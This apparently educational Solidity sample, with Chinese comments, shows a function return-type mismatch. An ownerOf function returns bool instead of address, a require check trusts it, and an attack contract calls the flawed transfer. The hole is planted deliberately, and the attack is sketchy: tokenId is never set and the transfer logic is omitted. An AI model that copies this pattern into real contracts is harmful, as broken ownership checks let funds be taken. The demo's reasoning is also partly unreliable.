pragma solidity >=0.8.0;

// 此程式碼示範了 Function Return Type Mismatch 的漏洞，
// 原始介面預期 ownerOf 回傳 address，但卻實作為 bool。
// 此漏洞可能使得檢查權限的 require 條件判斷錯誤，造成資金挪用或其他問題。

contract Token {
    // 儲存 token 擁有者，關鍵狀態變數
    mapping(uint256 => address) internal _owners;
    
    // 漏洞：錯誤的回傳類型，應回傳 address，但此處回傳 bool
    function ownerOf(uint256 tokenId) external view returns (bool) { // 漏洞重點：回傳類型錯誤
        return _owners[tokenId] != address(0);
    }
    
    // 用來模擬鑄幣，可設定 token 擁有者
    function mint(uint256 tokenId) external {
        _owners[tokenId] = msg.sender;
    }
}

contract Bob {
    // 定義 tokenId 為全域變數，方便檢查
    uint256 public tokenId;

    // 使用者呼叫此函數轉移 token（簡化邏輯）
    // 漏洞在於 require 使用了錯誤回傳類型的 ownerOf
    function transfer(address token) external {
        // 此 require 判斷本意應該檢查 token 擁有者是否為 msg.sender，但由於 ownerOf 回傳 bool，
        // 攻擊者可以部署一個錯誤實作的 Token 合約，讓此條件失效，造成資金被挪用。
        require(Token(token).ownerOf(tokenId), "Not owner"); // 漏洞重點：錯誤的檢查
        
        // 以下為轉移邏輯（簡化版本）
        // ...
    }
}

// 附加攻擊程式碼：
// 攻擊者部署 Attack 合約來利用上述漏洞
contract Attack {
    Token public vulnerableToken;
    Bob public bob;
    uint256 public tokenId = 1;
    
    // 部署時建立漏洞合約並鑄造 token
    constructor() {
        vulnerableToken = new Token();
        bob = new Bob();
        // 由於 mint 時使用 msg.sender，此處 vulnerableToken 的 token[1] 擁有者為 Attack 合約的位址
        vulnerableToken.mint(tokenId);
        
        // 攻擊者可能設定 Bob 合約中 tokenId 的值，但由於 tokenId 在 Bob 合約為 public 變數，
        // 此處假設已正確設定（或者 Bob 允許修改 tokenId，這裡為示範漏洞的利用概念）
    }
    
    // 攻擊流程：呼叫 Bob.transfer 時，傳入漏洞 Token 的地址，因為 ownerOf 回傳 bool
    // 攻擊者能繞過真正的權限檢查，從而操縱轉移流程。
    function attack() external {
         bob.transfer(address(vulnerableToken));
    }
}
